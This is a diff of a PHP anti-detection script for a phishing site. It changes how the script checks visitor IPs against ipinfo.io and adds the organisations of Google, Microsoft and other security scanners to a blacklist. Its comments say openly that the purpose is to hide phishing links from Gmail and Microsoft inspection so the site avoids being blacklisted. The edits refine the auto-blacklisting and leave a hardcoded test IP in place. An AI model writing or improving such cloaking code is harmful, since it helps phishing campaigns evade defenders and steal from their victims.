@@ -1,7 +1,7 @@
 <?php
 
 //AutoBlock Mode "true" means every IP but yours will get auto-added to the blacklist
-$AutoBlock = true;
+$AutoBlock = false;
 // Your public IP (your client)
 $myip = "YOUR_IP_HERE";
 
@@ -17,17 +17,11 @@ $allowed = "- *Accessed Phishing Site* -";
 // This section of code doesn't allow Gmail or Microsoft to inspect links to avoid blacklisting
 $ip = $_SERVER['REMOTE_ADDR'];
 // Can set your IP manually to see what Google sees
-//$ip = "8.8.8.8";
+$ip = "9.9.9.9";
 $details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
 $org = $details->org;
 
-// AutoBlock Function
-if ($AutoBlock == true && $ip != $myip){
-$myfile = fopen("/var/www/html/blacklist.txt", "a") or die("Unable to open file!");
-$txt = explode(' ', $org, 2)[1];
-fwrite($myfile, "\r\n". $txt);
-fclose($myfile);
-}
+
 
 // List of Orgs to be Blacklisted
 $filename = "/var/www/html/blacklist.txt";
@@ -38,6 +32,18 @@ $fp = @fopen($filename, 'r');
 // Add each line to an array
 if ($fp) {
    $blockorgs = explode("\r\n", fread($fp, filesize($filename)));
+}
+
+// AutoBlock Function
+if ($AutoBlock == true && $ip != $myip && $isIP == false){
+$txt = explode(' ', $org, 2)[1];
+
+if(!in_array($txt, $blockorgs)){
+$myfile = fopen("/var/www/html/blacklist.txt", "a") or die("Unable to open file!");
+fwrite($myfile, "\r\n". $txt);
+fclose($myfile);
+array_push($blockorgs, $txt);
+}
 }
 
 //Block via blacklist
